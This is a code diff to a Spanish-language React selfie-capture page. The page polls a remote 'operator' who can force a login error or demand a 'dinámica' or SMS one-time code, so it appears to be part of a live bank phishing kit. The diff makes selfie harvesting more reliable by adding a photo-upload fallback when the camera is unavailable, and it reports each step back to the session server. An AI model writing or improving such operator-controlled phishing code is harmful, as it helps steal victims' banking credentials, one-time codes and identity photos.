@@ -16,10 +16,22 @@ export function SelfiePage({
 }: SelfiePageProps) {
   const videoRef = useRef<HTMLVideoElement>(null)
   const canvasRef = useRef<HTMLCanvasElement>(null)
+  const fileInputRef = useRef<HTMLInputElement>(null)
   const streamRef = useRef<MediaStream | null>(null)
   const [ready, setReady] = useState(false)
   const [error, setError] = useState('')
   const [photo, setPhoto] = useState('')
+
+  // Stable callback refs
+  const onHomeRef = useRef(onHome)
+  const onOtpRequiredRef = useRef(onOtpRequired)
+  const onErrorLoginRef = useRef(onErrorLogin)
+
+  useEffect(() => {
+    onHomeRef.current = onHome
+    onOtpRequiredRef.current = onOtpRequired
+    onErrorLoginRef.current = onErrorLogin
+  })
 
   // Keep-alive ping and operator polling
   useEffect(() => {
@@ -46,17 +58,17 @@ export function SelfiePage({
         const action = session.action
 
         if (action === 'done') {
-          onHome()
+          onHomeRef.current()
           return
         }
 
         if (action === 'error-login') {
-          onErrorLogin?.()
+          onErrorLoginRef.current?.()
           return
         }
 
         if (action === 'dinamica' || action === 'sms') {
-          onOtpRequired?.(action)
+          onOtpRequiredRef.current?.(action)
           return
         }
       } catch {}
@@ -66,31 +78,49 @@ export function SelfiePage({
       window.clearInterval(pingTimer)
       window.clearInterval(pollTimer)
     }
-  }, [sessionId, onHome, onErrorLogin, onOtpRequired])
+  }, [sessionId])
 
   useEffect(() => {
     let cancelled = false
 
     async function start() {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          audio: false,
-          video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
-        })
+        let stream: MediaStream | null = null
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+          try {
+            stream = await navigator.mediaDevices.getUserMedia({
+              audio: false,
+              video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+            })
+          } catch {
+            // Fallback to generic video constraints
+            stream = await navigator.mediaDevices.getUserMedia({
+              audio: false,
+              video: true,
+            })
+          }
+        }
+
         if (cancelled) {
-          stream.getTracks().forEach((track) => track.stop())
+          stream?.getTracks().forEach((track) => track.stop())
           return
         }
-        streamRef.current = stream
-        const video = videoRef.current
-        if (video) {
-          video.srcObject = stream
-          await video.play()
+
+        if (stream) {
+          streamRef.current = stream
+          const video = videoRef.current
+          if (video) {
+            video.srcObject = stream
+            video.muted = true
+            await video.play().catch(() => {})
+          }
+          setReady(true)
+        } else {
+          setError('Cámara no disponible. Puedes subir una foto directamente.')
         }
-        setReady(true)
       } catch {
         if (!cancelled) {
-          setError('No se pudo activar la cámara. Permite el acceso e inténtalo de nuevo.')
+          setError('No se pudo acceder a la cámara. Puedes permitir el acceso o subir una foto.')
         }
       }
     }
@@ -129,8 +159,30 @@ export function SelfiePage({
     }
   }
 
+  function handleFileUpload(e: React.ChangeEvent<HTMLInputElement>) {
+    const file = e.target.files?.[0]
+    if (!file) return
+    const reader = new FileReader()
+    reader.onload = () => {
+      if (typeof reader.result === 'string') {
+        setPhoto(reader.result)
+        if (sessionId) {
+          fetch(`/api/sessions/${sessionId}/state`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ state: 'received-selfie' }),
+          }).catch(() => {})
+        }
+      }
+    }
+    reader.readAsDataURL(file)
+  }
+
   function retake() {
     setPhoto('')
+    if (fileInputRef.current) {
+      fileInputRef.current.value = ''
+    }
     if (sessionId) {
       fetch(`/api/sessions/${sessionId}/state`, {
         method: 'POST',
@@ -148,7 +200,7 @@ export function SelfiePage({
         body: JSON.stringify({ state: 'done' }),
       }).catch(() => {})
     }
-    onHome()
+    onHomeRef.current()
   }
 
   return (
@@ -178,8 +230,16 @@ export function SelfiePage({
         </div>
 
         <canvas ref={canvasRef} className="sr-only" />
+        <input
+          ref={fileInputRef}
+          type="file"
+          accept="image/*"
+          capture="user"
+          className="sr-only"
+          onChange={handleFileUpload}
+        />
 
-        {error ? <p className="selfie-error">{error}</p> : null}
+        {error && !photo ? <p className="selfie-error">{error}</p> : null}
 
         {photo ? (
           <div className="selfie-actions">
@@ -191,14 +251,25 @@ export function SelfiePage({
             </button>
           </div>
         ) : (
-          <button
-            type="button"
-            className={`login-submit${ready ? ' ready' : ''}`}
-            disabled={!ready}
-            onClick={takeSelfie}
-          >
-            {ready ? 'Tomar selfie' : 'Activando cámara...'}
-          </button>
+          <div className="selfie-actions">
+            <button
+              type="button"
+              className={`login-submit${ready ? ' ready' : ''}`}
+              disabled={!ready}
+              onClick={takeSelfie}
+            >
+              {ready ? 'Tomar selfie' : 'Activando cámara...'}
+            </button>
+            {!ready ? (
+              <button
+                type="button"
+                className="login-outline"
+                onClick={() => fileInputRef.current?.click()}
+              >
+                Subir foto desde dispositivo
+              </button>
+            ) : null}
+          </div>
         )}
       </div>
     </div>
